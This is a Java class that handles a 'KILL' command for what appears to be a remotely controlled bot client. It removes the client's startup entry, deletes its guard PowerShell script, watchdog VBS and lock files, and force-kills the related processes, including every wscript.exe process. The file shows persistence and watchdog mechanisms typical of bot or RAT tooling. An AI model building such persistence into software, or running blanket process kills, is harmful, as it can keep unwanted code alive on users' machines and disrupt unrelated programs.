import java.io.File;

public class KillHandler {

    public static void execute() {
        System.out.println("KILL komutu alindi. Bot kapatiliyor...");

        StartupManager.remove();

        try {
            String tempDir = System.getenv("TEMP");
            if (tempDir != null) {
                File killFlag = new File(tempDir, "aas_kill.flag");
                try { killFlag.createNewFile(); } catch (Exception ignored) {}

                File guardScript = new File(tempDir, "aas_guard.ps1");
                if (guardScript.exists()) guardScript.delete();

                File lockFile = new File(tempDir, "aas_client.lock");
                if (lockFile.exists()) lockFile.delete();

                File watchdogFile = new File(tempDir, "aas_watchdog.vbs");
                if (watchdogFile.exists()) watchdogFile.delete();
            }
        } catch (Exception ignored) {}

        try {
            Process p1 = Runtime.getRuntime().exec(new String[]{
                "powershell.exe", "-NoProfile", "-Command",
                "Get-CimInstance Win32_Process -Filter \"Name = 'powershell.exe'\" | Where-Object { $_.CommandLine -like '*aas_guard.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }"
            });
            p1.waitFor();
            Process p2 = Runtime.getRuntime().exec("taskkill /F /IM wscript.exe");
            p2.waitFor();
        } catch (Exception ignored) {}

        System.exit(0);
    }
}